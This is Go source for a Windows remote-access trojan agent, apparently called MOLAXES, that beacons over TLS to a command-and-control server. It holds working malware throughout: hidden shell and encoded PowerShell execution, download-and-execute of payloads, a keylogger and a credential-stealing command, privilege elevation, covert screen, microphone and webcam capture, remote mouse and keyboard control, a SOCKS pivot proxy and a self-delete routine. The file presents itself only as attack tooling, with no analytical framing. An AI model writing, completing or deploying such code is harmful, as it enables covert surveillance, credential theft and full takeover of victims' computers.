package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"image"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)



type session struct {
	conn       net.Conn
	aesKey     []byte
	gcm        cipher.AEAD
	sendCh     chan []byte
	stopAll    bool
	mu         sync.Mutex
	stopScreen bool
	stopMic    bool
	stopCam    bool
}

type packet struct {
	Cmd  string            `json:"cmd"`
	ID   string            `json:"id"`
	Args map[string]string `json:"args"`
	Data string            `json:"data"`
}

type reply struct {
	ID   string `json:"id"`
	Data string `json:"data"`
	Err  string `json:"err,omitempty"`
}

type beacon struct {
	AgentID  string `json:"agent_id"`
	OS       string `json:"os"`
	Username string `json:"username"`
	Hostname string `json:"hostname"`
	Arch     string `json:"arch"`
	IsAdmin  bool   `json:"is_admin"`
	PID      int    `json:"pid"`
}

func sendFrame(conn net.Conn, data []byte) error {
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(data)))
	if _, err := conn.Write(lenBuf); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func recvFrame(conn net.Conn) ([]byte, error) {
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(lenBuf)
	if n == 0 || n > 64*1024*1024 {
		return nil, fmt.Errorf("invalid frame length: %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (s *session) encryptFrame(plain []byte) ([]byte, error) {
	nonce := make([]byte, s.gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	ciphertext := s.gcm.Seal(nonce, nonce, plain, nil)
	return ciphertext, nil
}

func (s *session) decryptFrame(data []byte) ([]byte, error) {
	nonceSize := s.gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("frame too short")
	}
	nonce, ct := data[:nonceSize], data[nonceSize:]
	return s.gcm.Open(nil, nonce, ct, nil)
}

func (s *session) sendPkt(pkt interface{}) error {
	b, err := json.Marshal(pkt)
	if err != nil {
		return err
	}
	enc, err := s.encryptFrame(b)
	if err != nil {
		return err
	}
	return sendFrame(s.conn, enc)
}

func (s *session) recvPkt(out interface{}) error {
	frame, err := recvFrame(s.conn)
	if err != nil {
		return err
	}
	plain, err := s.decryptFrame(frame)
	if err != nil {
		return err
	}
	return json.Unmarshal(plain, out)
}

func (s *session) handshake() error {
	pemFrame, err := recvFrame(s.conn)
	if err != nil {
		return fmt.Errorf("handshake: recv pubkey: %w", err)
	}
	block, _ := pem.Decode(pemFrame)
	if block == nil {
		return fmt.Errorf("handshake: bad PEM")
	}
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("handshake: parse pubkey: %w", err)
	}
	rsaPub, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("handshake: not RSA key")
	}
	s.aesKey = make([]byte, 32)
	if _, err := rand.Read(s.aesKey); err != nil {
		return fmt.Errorf("handshake: gen aes key: %w", err)
	}
	encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, s.aesKey, nil)
	if err != nil {
		return fmt.Errorf("handshake: encrypt key: %w", err)
	}
	if err := sendFrame(s.conn, encrypted); err != nil {
		return fmt.Errorf("handshake: send encrypted key: %w", err)
	}
	block2, err := aes.NewCipher(s.aesKey)
	if err != nil {
		return fmt.Errorf("handshake: aes cipher: %w", err)
	}
	s.gcm, err = cipher.NewGCM(block2)
	if err != nil {
		return fmt.Errorf("handshake: gcm: %w", err)
	}
	log_("session: handshake OK")
	return nil
}

func connectTCP() (net.Conn, error) {
	ep := net.JoinHostPort(c2Host, c2Port)
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	for {
		conn, err := tls.DialWithDialer(
			&net.Dialer{Timeout: 15 * time.Second},
			"tcp", ep, tlsCfg,
		)
		if err != nil {
			log_(fmt.Sprintf("connectTCP: %v — retrying in 5s", err))
			time.Sleep(5 * time.Second)
			continue
		}
		log_(fmt.Sprintf("connectTCP: connected to %s", ep))
		return conn, nil
	}
}

func runSession() {
	for {
		conn, err := connectTCP()
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		s := &session{
			conn:   conn,
			sendCh: make(chan []byte, 256),
		}
		if err := s.handshake(); err != nil {
			log_(fmt.Sprintf("runSession: handshake failed: %v", err))
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}
		if err := s.sendBeacon(); err != nil {
			log_(fmt.Sprintf("runSession: beacon failed: %v", err))
			conn.Close()
			continue
		}
		go s.sendLoop()
		s.recvLoop()
		conn.Close()
		log_("runSession: disconnected, reconnecting in 5s")
		time.Sleep(5 * time.Second)
	}
}

func (s *session) sendBeacon() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	b := beacon{
		AgentID:  agentID(),
		OS:       "windows",
		Username: username,
		Hostname: hostname,
		Arch:     "amd64",
		IsAdmin:  isAdmin(),
		PID:      os.Getpid(),
	}
	return s.sendPkt(b)
}

func agentID() string {
	idPath := filepath.Join(os.TempDir(), ".aid")
	if data, err := os.ReadFile(idPath); err == nil {
		id := strings.TrimSpace(string(data))
		if len(id) == 16 {
			return id
		}
	}
	b := make([]byte, 8)
	rand.Read(b)
	id := fmt.Sprintf("%x", b)
	os.WriteFile(idPath, []byte(id), 0600)
	return id
}

func (s *session) sendLoop() {
	for data := range s.sendCh {
		if err := func() error {
			enc, err := s.encryptFrame(data)
			if err != nil {
				return err
			}
			return sendFrame(s.conn, enc)
		}(); err != nil {
			log_(fmt.Sprintf("sendLoop: %v", err))
			return
		}
	}
}

func (s *session) send(id string, data string, errStr string) {
	r := reply{ID: id, Data: data, Err: errStr}
	b, _ := json.Marshal(r)
	select {
	case s.sendCh <- b:
	default:
	}
}

func (s *session) recvLoop() {
	for {

		var pkt packet
		if err := s.recvPkt(&pkt); err != nil {
			log_(fmt.Sprintf("recvLoop: %v", err))
			return
		}
		log_(fmt.Sprintf("cmd: %s id: %s", pkt.Cmd, pkt.ID))
		go s.dispatch(pkt)
	}
}

func (s *session) dispatch(pkt packet) {
	// any panic in a command must not kill the whole agent process
	defer func() {
		if r := recover(); r != nil {
			log_(fmt.Sprintf("dispatch panic on cmd=%s: %v", pkt.Cmd, r))
			s.send(pkt.ID, "", fmt.Sprintf("internal error: %v", r))
		}
	}()

	var out string

	var errStr string

	switch pkt.Cmd {
	case "exec":
		out = execCommand(pkt.Args["cmd"])
	case "cd":
		if err := os.Chdir(pkt.Args["path"]); err != nil {
			errStr = err.Error()
		} else {
			out, _ = os.Getwd()
		}
	case "ls":
		out = listDir(pkt.Args["path"])
	case "ul":
		data, err := os.ReadFile(pkt.Args["path"])
		if err != nil {
			errStr = err.Error()
		} else {
			out = string(data)
		}
	case "dl":
		if err := downloadFile(pkt.Args["url"], pkt.Args["path"]); err != nil {
			errStr = err.Error()
		} else {
			out = "ok"
		}
	case "rm":
		if err := os.Remove(pkt.Args["path"]); err != nil {
			errStr = err.Error()
		} else {
			out = "ok"
		}
	case "mkdir":
		if err := os.MkdirAll(pkt.Args["path"], 0755); err != nil {
			errStr = err.Error()
		} else {
			out = "ok"
		}
	case "screen":
		s.stopScreen = false
		go s.tcpStreamScreen(pkt.ID)
		return
	case "stopscreen":
		s.stopScreen = true
		out = "ok"
	case "mic":
		s.stopMic = false
		go s.tcpStreamMic(pkt.ID)
		return
	case "stopmic":
		s.stopMic = true
		out = "ok"
	case "cam":
		s.stopCam = false
		go s.tcpStreamCam(pkt.ID, pkt.Args)
		return
	case "stopcam":
		s.stopCam = true
		out = "ok"
	case "keylog":
		startKeylogger()
		out = "started"
	case "stopkeylog":
		stopKeylogger()
		out = "stopped"
	case "getkeylog":
		out = getKeyloggerData()
	case "steal":
		go func() {
			res := Steal()
			encoded := "b64:" + base64.StdEncoding.EncodeToString([]byte(res))
			s.send(pkt.ID, encoded, "")
		}()
		return
	case "elevate":
		mode := 1
		if pkt.Args["mode"] == "2" {
			mode = 2
		}
		if err := Elevate(mode); err != nil {
			errStr = err.Error()
		} else {
			out = "ok"
		}
	case "info":
		out = sysInfoStr()
	case "cps":
		// PowerShell -EncodedCommand (UTF-16LE b64 from the panel)
		b64 := pkt.Args["b"]
		raw, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			errStr = "cps b64: " + err.Error()
		} else {
			cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-EncodedCommand", string(raw))
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			buf, cErr := cmd.CombinedOutput()
			if cErr != nil {
				out = fmt.Sprintf("Error: %v\n%s", cErr, string(buf))
			} else {
				out = string(buf)
			}
		}
	case "chat":
		msg := pkt.Args["msg"]
		title, terr := syscall.UTF16PtrFromString("MOLAXES Chat")
		text, xerr := syscall.UTF16PtrFromString(msg)
		if terr != nil || xerr != nil {
			errStr = "chat utf16: bad string"
			break
		}
		user32Chat := syscall.NewLazyDLL("user32.dll")
		user32Chat.NewProc("MessageBoxW").Call(0,
			uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(title)), uintptr(0x40))
		out = "ok"
	case "npsave":
		// write a file with b64 payload (Notepad / hosts editing)
		path := pkt.Args["path"]
		raw, derr := base64.StdEncoding.DecodeString(pkt.Args["b"])
		if derr != nil {
			errStr = "npsave b64: " + derr.Error()
		} else if wErr := os.WriteFile(path, raw, 0644); wErr != nil {
			errStr = wErr.Error()
		} else {
			out = "ok"
		}
	case "mmove":
		x, _ := strconv.Atoi(pkt.Args["x"])
		y, _ := strconv.Atoi(pkt.Args["y"])
		sendInputMouse(int32(x), int32(y), 0, 0x0001|0x8000) // MOVE|ABSOLUTE
		out = "ok"
	case "mclick":
		x, _ := strconv.Atoi(pkt.Args["x"])
		y, _ := strconv.Atoi(pkt.Args["y"])
		btn := pkt.Args["b"]
		fDown, fUp := uint32(0x0002), uint32(0x0004) // left
		if btn == "r" {
			fDown, fUp = 0x0008, 0x0010
		}
		sendInputMouse(int32(x), int32(y), 0, 0x0001|0x8000)
		sendInputMouse(0, 0, 0, fDown)
		sendInputMouse(0, 0, 0, fUp)
		out = "ok"
	case "mscroll":
		x, _ := strconv.Atoi(pkt.Args["x"])
		y, _ := strconv.Atoi(pkt.Args["y"])
		d, _ := strconv.Atoi(pkt.Args["d"])
		sendInputMouse(int32(x), int32(y), uint32(d*120), 0x0001|0x8000|0x0800) // MOVE|ABSOLUTE|WHEEL
		out = "ok"
	case "mkey":
		typeText(pkt.Args["t"])
		out = "ok"
	case "sleep":
		msStr := pkt.Args["ms"]
		ms, convErr := strconv.Atoi(msStr)
		if convErr != nil || ms <= 0 {
			ms = 30000
		}
		if ms > 3600000 {
			ms = 3600000
		}
		log_(fmt.Sprintf("doTask: sleep %dms", ms))
		time.Sleep(time.Duration(ms) * time.Millisecond)
		out = "ok"
	case "proxy":
		go p2pSocks(pkt.Args["addr"])
		out = "started"
	case "dlexec":
		url := pkt.Args["url"]
		b64Payload := pkt.Args["b64"]
		fname := pkt.Args["name"]
		pattern := "dlexec_*.exe"
		if fname != "" {
			ext := filepath.Ext(fname)
			if ext != "" {
				base := strings.TrimSuffix(fname, ext)
				pattern = base + "_*" + ext
			} else {
				pattern = fname + "_*.exe"
			}
		}
		if b64Payload != "" {
			rawBytes, err := base64.StdEncoding.DecodeString(b64Payload)
			if err != nil {
				errStr = "dlexec b64 decode: " + err.Error()
			} else {
				tmpFile, err := os.CreateTemp("", pattern)
				if err != nil {
					errStr = "dlexec temp: " + err.Error()
				} else {
					tmpPath := tmpFile.Name()
					tmpFile.Write(rawBytes)
					tmpFile.Close()
					os.Chmod(tmpPath, 0755)
					go func() {
						execCommand(tmpPath)
					}()
					out = "ok: " + tmpPath
				}
			}
		} else if url != "" {
			tmpFile, err := os.CreateTemp("", pattern)
			if err != nil {
				errStr = "dlexec temp: " + err.Error()
			} else {
				tmpPath := tmpFile.Name()
				tmpFile.Close()
				if err := downloadFile(url, tmpPath); err != nil {
					errStr = "dlexec dl: " + err.Error()
					os.Remove(tmpPath)
				} else {
					os.Chmod(tmpPath, 0755)
					go func() {
						execCommand(tmpPath)
					}()
					out = "ok: " + tmpPath
				}
			}
		} else {
			errStr = "dlexec: no payload or url"
		}
	case "kill":
		s.send(pkt.ID, "bye", "")
		time.Sleep(200 * time.Millisecond)
		Suicide(0)
		return
	default:
		errStr = "unknown cmd: " + pkt.Cmd
	}

	s.send(pkt.ID, out, errStr)
}

// ---- SendInput plumbing (control of input) --------------------------------

type mouseInput struct {
	Dx, Dy         int32
	MouseData      uint32
	DwFlags        uint32
	Dime           uint32
	DwExtraInfo    uintptr
}

// union slot sized to the largest member (MOUSEINPUT = 32 bytes on amd64)
type inputT struct {
	Itype uint32
	Union [32]byte
}

const (
	_inputMouse  = 0
	_inputKeyb   = 1
	_keyUnicode  = 0x0004
	_keyUp       = 0x0002
)

func sendInputRaw(in []inputT) {
	user32In := syscall.NewLazyDLL("user32.dll")
	proc := user32In.NewProc("SendInput")
	n := uintptr(len(in))
	arr := make([]inputT, n)
	copy(arr, in)
	proc.Call(n, uintptr(unsafe.Pointer(&arr[0])), unsafe.Sizeof(inputT{}))
}

func sendInputMouse(x, y int32, mouseData, flags uint32) {
	var m mouseInput
	m.Dx, m.Dy = x, y
	m.MouseData = mouseData
	m.DwFlags = flags
	m.DwExtraInfo = 0
	var in inputT
	in.Itype = _inputMouse
	binary.LittleEndian.PutUint32(in.Union[0:4], uint32(m.Dx))
	binary.LittleEndian.PutUint32(in.Union[4:8], uint32(m.Dy))
	binary.LittleEndian.PutUint32(in.Union[8:12], m.MouseData)
	binary.LittleEndian.PutUint32(in.Union[12:16], m.DwFlags)
	binary.LittleEndian.PutUint32(in.Union[16:20], m.Dime)
	in.Union[20] = 0
	sendInputRaw([]inputT{in})
}

func keyEventUnicode(char rune) []inputT {
	pair := make([]inputT, 2)
	code := uint16(char)
	// down
	pair[0].Itype = _inputKeyb
	binary.LittleEndian.PutUint16(pair[0].Union[0:2], 0)  // wVk
	binary.LittleEndian.PutUint16(pair[0].Union[2:4], code) // wScan
	binary.LittleEndian.PutUint32(pair[0].Union[4:8], _keyUnicode)
	// up
	pair[1].Itype = _inputKeyb
	binary.LittleEndian.PutUint16(pair[1].Union[0:2], 0)
	binary.LittleEndian.PutUint16(pair[1].Union[2:4], code)
	binary.LittleEndian.PutUint32(pair[1].Union[4:8], _keyUnicode|_keyUp)
	return pair
}

func keyEventVK(vk uint16) []inputT {
	pair := make([]inputT, 2)
	pair[0].Itype = _inputKeyb
	binary.LittleEndian.PutUint16(pair[0].Union[0:2], vk)
	pair[1].Itype = _inputKeyb
	binary.LittleEndian.PutUint16(pair[1].Union[0:2], vk)
	binary.LittleEndian.PutUint32(pair[1].Union[4:8], _keyUp)
	return pair
}

func typeText(text string) {
	var seq []inputT
	for _, r := range text {
		if r == '\n' || r == '\r' {
			seq = append(seq, keyEventVK(0x0D)...)
			continue
		}
		if r == '\t' {
			seq = append(seq, keyEventVK(0x09)...)
			continue
		}
		seq = append(seq, keyEventUnicode(r)...)
	}
	if len(seq) > 0 {
		sendInputRaw(seq)
	}
}

func sysInfoStr() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	wd, _ := os.Getwd()
	return fmt.Sprintf("hostname=%s user=%s pid=%d wd=%s admin=%v",
		hostname, username, os.Getpid(), wd, isAdmin())
}

func (s *session) tcpStreamScreen(id string) {
	time.Sleep(150 * time.Millisecond) // let any menu animation settle
	data, err := captureScreenPNG()
	if err != nil {
		s.send(id, "", "screen capture: "+err.Error())
		return
	}
	s.send(id, "b64:"+base64.StdEncoding.EncodeToString(data), "")
	for !s.stopScreen {
		time.Sleep(500 * time.Millisecond)
	}
}

func captureScreenPNG() ([]byte, error) {
	user32DLL := syscall.NewLazyDLL("user32.dll")
	gdi32DLL := syscall.NewLazyDLL("gdi32.dll")

	w, _, _ := user32DLL.NewProc("GetSystemMetrics").Call(uintptr(0))
	h, _, _ := user32DLL.NewProc("GetSystemMetrics").Call(uintptr(1))
	W, H := int(w), int(h)
	if W <= 0 || H <= 0 || W > 8192 || H > 8192 {
		return nil, fmt.Errorf("bad screen metrics %dx%d", W, H)
	}

	desk, _, _ := user32DLL.NewProc("GetDesktopWindow").Call()
	dc, _, dcErr := user32DLL.NewProc("GetDC").Call(desk)
	if dc == 0 {
		return nil, fmt.Errorf("GetDC: %v", dcErr)
	}
	defer user32DLL.NewProc("ReleaseDC").Call(desk, dc)

	mdc, _, _ := gdi32DLL.NewProc("CreateCompatibleDC").Call(dc)
	if mdc == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer gdi32DLL.NewProc("DeleteDC").Call(mdc)

	bmp, _, _ := gdi32DLL.NewProc("CreateCompatibleBitmap").Call(dc, uintptr(W), uintptr(H))
	if bmp == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer gdi32DLL.NewProc("DeleteObject").Call(bmp)

	old, _, _ := gdi32DLL.NewProc("SelectObject").Call(mdc, bmp)
	defer gdi32DLL.NewProc("SelectObject").Call(mdc, old)

	if r, _, berr := gdi32DLL.NewProc("BitBlt").Call(mdc, 0, 0, uintptr(W), uintptr(H), dc, 0, 0, uintptr(0x00CC0020)); r == 0 {
		return nil, fmt.Errorf("BitBlt: %v", berr)
	}

	type bmiHeader struct {
		BiSize, BiWidth, BiHeight       uint32
		BiPlanes, BiBitCount            uint16
		BiCompression, BiSizeImage      uint32
		BiXPelsPerMeter, BiYPelsPerMeter uint32
		BiClrUsed, BiClrImportant       uint32
	}
	bi := bmiHeader{BiSize: 40, BiWidth: uint32(W), BiHeight: uint32(H), BiPlanes: 1, BiBitCount: 32}

	bits := make([]byte, W*H*4)
	if r, _, gerr := gdi32DLL.NewProc("GetDIBits").Call(mdc, bmp, 0, uintptr(H),
		uintptr(unsafe.Pointer(&bits[0])), uintptr(unsafe.Pointer(&bi)), uintptr(0)); r == 0 {
		return nil, fmt.Errorf("GetDIBits: %v", gerr)
	}

	img := image.NewRGBA(image.Rect(0, 0, W, H))
	stride := W * 4
	for y := 0; y < H; y++ {
		src := bits[(H-1-y)*stride : (H-1-y)*stride+stride]
		dst := img.Pix[y*img.Stride : y*img.Stride+W*4]
		for x := 0; x < W; x++ {
			dst[x*4] = src[x*4+2]   // R
			dst[x*4+1] = src[x*4+1] // G
			dst[x*4+2] = src[x*4]   // B
			dst[x*4+3] = 0xFF
		}
	}

	var out bytes.Buffer
	if err := png.Encode(&out, img); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func (s *session) tcpStreamMic(id string) {
	ffmpegPath := os.ExpandEnv(`${TEMP}\ffmpeg.exe`)
	if _, statErr := os.Stat(ffmpegPath); statErr != nil {
		s.send(id, "", "ffmpeg.exe not found in TEMP — mic capture disabled")
		return
	}
	c := execCmd(ffmpegPath, "-f", "dshow",
		"-i", "audio=@device_cm_...",
		"-f", "s16le", "-ar", "8000", "-ac", "1", "pipe:1")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, stdout, err := c.run()
	if err != nil || stdout == nil {
		s.send(id, "", "mic: ffmpeg start failed: "+errString(err))
		return
	}
	buf := make([]byte, 16000)
	for !s.stopMic {
		n, err := stdout.Read(buf)
		if err != nil {
			break
		}
		s.send(id, string(buf[:n]), "")
	}
}

func (s *session) tcpStreamCam(id string, args map[string]string) {
	w, h := args["w"], args["h"]
	if w == "" {
		w = "320"
	}
	if h == "" {
		h = "240"
	}
	ffmpegPath := os.ExpandEnv(`${TEMP}\ffmpeg.exe`)
	if _, statErr := os.Stat(ffmpegPath); statErr != nil {
		s.send(id, "", "ffmpeg.exe not found in TEMP — cam capture disabled (drop ffmpeg.exe into %TEMP%)")
		return
	}
	c := execCmd(ffmpegPath,
		"-f", "dshow", "-i", "video=...",
		"-vf", fmt.Sprintf("scale=%s:%s", w, h),
		"-r", "15", "-f", "image2pipe", "-vcodec", "mjpeg", "pipe:1")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, stdout, err := c.run()
	if err != nil || stdout == nil {
		s.send(id, "", "cam: ffmpeg start failed: "+errString(err))
		return
	}
	buf := make([]byte, 65536)
	for !s.stopCam {
		n, err := stdout.Read(buf)
		if err != nil {
			break
		}
		s.send(id, string(buf[:n]), "")
	}
}

func errString(e error) string {
	if e == nil {
		return "nil"
	}
	return e.Error()
}

func execCmd(name string, args ...string) *execCmdT {
	return &execCmdT{name: name, args: args}
}

type execCmdT struct {
	name        string
	args        []string
	SysProcAttr *syscall.SysProcAttr
}

func (c *execCmdT) run() (*exec.Cmd, io.ReadCloser, error) {
	cmd := exec.Command(c.name, c.args...)
	cmd.SysProcAttr = c.SysProcAttr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	return cmd, stdout, nil
}

func execCommand(cmdStr string) string {
	cmd := exec.Command("cmd", "/C", cmdStr)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(out))
	}
	return string(out)
}

func listDir(pathStr string) string {
	if pathStr == "" {
		pathStr = "."
	}
	entries, err := os.ReadDir(pathStr)
	if err != nil {
		return err.Error()
	}
	var sb strings.Builder
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		dirFlag := "FILE"
		if e.IsDir() {
			dirFlag = "DIR "
		}
		sb.WriteString(fmt.Sprintf("%s  %8d  %s  %s\n",
			dirFlag, info.Size(), info.ModTime().Format("2006-01-02 15:04:05"), e.Name()))
	}
	return sb.String()
}

func p2pSocks(targetAddr string) {
	ln, err := net.Listen("tcp", targetAddr)
	if err != nil {
		log_(fmt.Sprintf("socks listen %s: %v", targetAddr, err))
		return
	}
	log_(fmt.Sprintf("socks listening: %s", targetAddr))
	for {
		c, err := ln.Accept()
		if err != nil {
			log_(fmt.Sprintf("socks accept: %v", err))
			return
		}
		go handleSocks5(c)
	}
}

func handleSocks5(c net.Conn) {
	defer c.Close()
	c.SetReadDeadline(time.Now().Add(15 * time.Second))

	hdr := make([]byte, 2)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return
	}
	if hdr[0] != 5 {
		return
	}
	if nm := int(hdr[1]); nm > 0 {
		mm := make([]byte, nm)
		if _, err := io.ReadFull(c, mm); err != nil {
			return
		}
	}
	if _, err := c.Write([]byte{5, 0x00}); err != nil { // no auth
		return
	}

	req := make([]byte, 4)
	if _, err := io.ReadFull(c, req); err != nil {
		return
	}
	if req[1] != 0x01 { // CONNECT only
		c.Write([]byte{5, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	var host string
	switch req[3] {
	case 0x01:
		b := make([]byte, 4)
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = net.IP(b).String()
	case 0x03:
		lb := make([]byte, 1)
		if _, err := io.ReadFull(c, lb); err != nil {
			return
		}
		if lb[0] == 0 || lb[0] > 255 {
			return
		}
		b := make([]byte, lb[0])
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = string(b)
	case 0x04:
		b := make([]byte, 16)
		if _, err := io.ReadFull(c, b); err != nil {
			return
		}
		host = net.IP(b).String()
	default:
		c.Write([]byte{5, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	pb := make([]byte, 2)
	if _, err := io.ReadFull(c, pb); err != nil {
		return
	}
	port := binary.BigEndian.Uint16(pb)
	dest := net.JoinHostPort(host, strconv.Itoa(int(port)))

	target, err := net.DialTimeout("tcp", dest, 15*time.Second)
	c.SetReadDeadline(time.Time{})
	if err != nil {
		c.Write([]byte{5, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer target.Close()
	c.Write([]byte{5, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	done := make(chan struct{}, 1)
	go func() {
		io.Copy(c, target)
		done <- struct{}{}
		c.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	}()
	io.Copy(target, c)
	<-done
}
